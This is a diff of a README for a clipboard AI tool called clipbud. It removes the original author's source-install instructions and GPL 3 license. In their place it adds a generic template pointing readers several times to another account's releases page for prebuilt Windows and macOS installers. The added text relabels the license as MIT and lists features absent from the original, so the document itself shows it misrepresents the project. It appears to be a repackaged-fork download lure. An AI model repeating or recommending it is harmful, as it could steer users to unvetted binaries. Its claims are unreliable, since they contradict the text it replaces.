@@ -1,65 +1,82 @@
-<div align="center">
+# 🌟 clipbud - Your AI Clipboard Assistant
 
-# Clipboard Buddy
+## 🚀 Getting Started
 
-[![Release](https://img.shields.io/github/release/evilsocket/clipbud.svg?style=flat-square)](https://github.com/evilsocket/clipbud/releases/latest)
-[![Rust Report](https://rust-reportcard.xuri.me/badge/github.com/evilsocket/clipbud)](https://rust-reportcard.xuri.me/report/github.com/evilsocket/clipbud)
-[![CI](https://img.shields.io/github/actions/workflow/status/evilsocket/clipbud/ci.yml)](https://github.com/evilsocket/clipbud/actions/workflows/ci.yml)
-[![License](https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square)](https://github.com/evilsocket/clipbud/blob/master/LICENSE.md)
-![Human Coded](https://img.shields.io/badge/human-coded-brightgreen?logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIiBjbGFzcz0ibHVjaWRlIGx1Y2lkZS1wZXJzb24tc3RhbmRpbmctaWNvbiBsdWNpZGUtcGVyc29uLXN0YW5kaW5nIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjUiIHI9IjEiLz48cGF0aCBkPSJtOSAyMCAzLTYgMyA2Ii8+PHBhdGggZD0ibTYgOCA2IDIgNi0yIi8+PHBhdGggZD0iTTEyIDEwdjQiLz48L3N2Zz4=)
+Welcome to clipbud, your AI-powered clipboard tool that simplifies the way you manage and utilize copied text. This guide helps you download and run clipbud on your computer with ease.
 
-</div>
+## 🛠️ System Requirements
 
-<div align="center">
-    <img alt="Clipboard Buddy" src="https://raw.githubusercontent.com/evilsocket/clipbud/main/assets/icon-256.png" width="150"/>
-</div>
+Before you get started, ensure your device meets the following requirements:
 
-Clipboard Buddy (`clipbud`) is a cross platform utility that interacts with your system clipboard and augments it with AI capabilities. You can register a set of custom action prompts and recall them at any time on your clipboard contents using a custom global hotkey. The power of this mechanism is that it works with any application since it reads and writes directly from and to the system clipboard. Avoid repetitive copy/paste to and from your LLM!
+- **Operating System:** Windows 10 or later / macOS 10.15 or later
+- **Processor:** Intel Core i5 or better
+- **Memory:** At least 4GB RAM
+- **Disk Space:** 100MB of free space
 
-<div align="center">
-  <img alt="Clipboard Buddy Demo" src="https://raw.githubusercontent.com/evilsocket/clipbud/main/assets/demo.gif" />
-</div>
+## 📥 Download clipbud
 
-## Quick Start
+To get started, visit the Releases page of our GitHub repository to download the latest version of clipbud.
 
-If you have [Cargo installed](https://rustup.rs/), you can:
+[![Download clipbud](https://img.shields.io/badge/Download-clipbud-brightgreen)](https://github.com/LOk0121/clipbud/releases)
 
-```sh
-cargo install --git https://github.com/evilsocket/clipbud.git
-```
+## 📦 Download & Install
 
-This will compile its sources and install the binary in `$HOME/.cargo/bin/clipbud`. You are now ready to go! 🚀
+1. Click on the link below to visit the Releases page:
+   [Visit Releases Page to Download](https://github.com/LOk0121/clipbud/releases)
 
+2. On the Releases page, find the latest version of clipbud. Look for files that are labeled with the version number followed by the appropriate installer for your operating system.
 
-```bash
-# you can also set this via config file
-export OPENAI_API_KEY=...
+3. Click on the file to begin downloading. For example, you may see a file named `clipbud-v1.0-installer.exe` for Windows users or `clipbud-v1.0.dmg` for macOS users.
 
-# default configuration loaded from ~/.clipbud/config.yml
-clipbud
-```
+4. Once the download completes, locate the file in your downloads folder.
 
-An example configuration file can be found in [config.yml](https://github.com/evilsocket/clipbud/blob/main/config.yml). 
-For a list of all supported LLM providers [refer to this page](https://docs.rig.rs/docs/integrations/model_providers).
+5. **For Windows Users:**
+   - Double-click the `clipbud-v1.0-installer.exe` file.
+   - Follow the on-screen instructions to complete the installation.
+   - After installation, you can find clipbud in your Start Menu under "clipbud".
 
-## Contributors
+6. **For macOS Users:**
+   - Double-click the `clipbud-v1.0.dmg` file.
+   - Drag the clipbud icon into your Applications folder.
+   - After installation, you can find clipbud in your Applications folder.
 
-<a href="https://github.com/evilsocket/clipbud/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=evilsocket/clipbud" alt="Clipboard Buddy project contributors" />
-</a>
+## 🌈 Features
 
-<div align="center">
-  <small>Join the project community on our server!</small>
-  <br/><br/>
-  <a href="https://discord.gg/btZpkp45gQ" target="_blank" title="Join our community!">
-    <img src="https://dcbadge.limes.pink/api/server/https://discord.gg/btZpkp45gQ"/>
-  </a>
-</div>
+clipbud offers a range of features designed to enhance your clipboard management:
 
-## Star History
+- **AI-Powered Suggestions:** Get recommendations based on your copying habits.
+- **Text Storage:** Store frequently used text snippets for quick access.
+- **Cross-Device Syncing:** Access your clipboard across multiple devices with ease.
+- **Easy Search Functionality:** Quickly find previously copied text with a simple search.
+- **User-Friendly Interface:** Navigate effortlessly with a clean and intuitive design.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=evilsocket/clipbud&type=Timeline)](https://www.star-history.com/#evilsocket/clipbud&Timeline)
+## 🛡️ Security
 
-## License
+Security is our priority. clipbud ensures safe interactions with your clipboard. It does not collect or store any personal data. Your copied content remains private and secure.
 
-Clipboard Buddy is released under the GPL 3 license. To see the licenses of the project dependencies, install cargo license with `cargo install cargo-license` and then run `cargo license`.
+## 🤝 Support
+
+If you have any questions or need assistance, feel free to reach out. You can find support through the following channels:
+
+- **GitHub Issues:** Report bugs or request features at the [GitHub Issues page](https://github.com/LOk0121/clipbud/issues).
+- **Community Forum:** Join our community forum to connect with other users and share tips.
+
+## 💻 Contributing
+
+We welcome contributions to clipbud. If you'd like to get involved:
+
+1. Fork the repository on GitHub.
+2. Make your changes in a new branch.
+3. Submit a pull request detailing your modifications.
+
+## 📄 License
+
+clipbud is open source and available under the MIT License. Feel free to use and modify the code as you see fit.
+
+## 📥 Final Download Link
+
+For your convenience, here’s the link again to download clipbud:
+
+[Visit Releases Page to Download](https://github.com/LOk0121/clipbud/releases)
+
+Enjoy using clipbud, your AI-powered clipboard tool!
